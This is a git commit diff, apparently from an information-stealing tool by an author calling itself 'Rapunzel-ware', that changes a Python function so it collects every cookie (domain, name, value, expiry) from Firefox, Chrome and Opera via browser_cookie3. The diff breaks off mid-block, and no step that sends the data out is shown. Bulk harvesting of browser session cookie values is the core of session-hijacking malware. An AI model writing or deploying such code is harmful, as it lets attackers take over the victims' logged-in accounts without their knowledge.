2d93b99210ff8423eff116e96414b9ee31ffd9ee
Rapunzel-ware <96635023+Rapunzel-ware@users.noreply.github.com>
2023-05-13 20:19:18 +0200

    Update browser.py

--- functions/browser.py
+++ functions/browser.py
@@ -4,7 +4,26 @@ import browser_cookie3
 
 def get_browser_cookies():
     cookies = []
+
     for cookie in browser_cookie3.firefox():
+        cookie_info = {
+            'domain': cookie.domain,
+            'name': cookie.name,
+            'value': cookie.value,
+            'expires': cookie.expires
+        }
+        cookies.append(cookie_info)
+
+    for cookie in browser_cookie3.chrome():
+        cookie_info = {
+            'domain': cookie.domain,
+            'name': cookie.name,
+            'value': cookie.value,
+            'expires': cookie.expires
+        }
+        cookies.append(cookie_info)
+
+    for cookie in browser_cookie3.opera():
         cookie_info = {
             'domain': cookie.domain,
             'name': cookie.name,
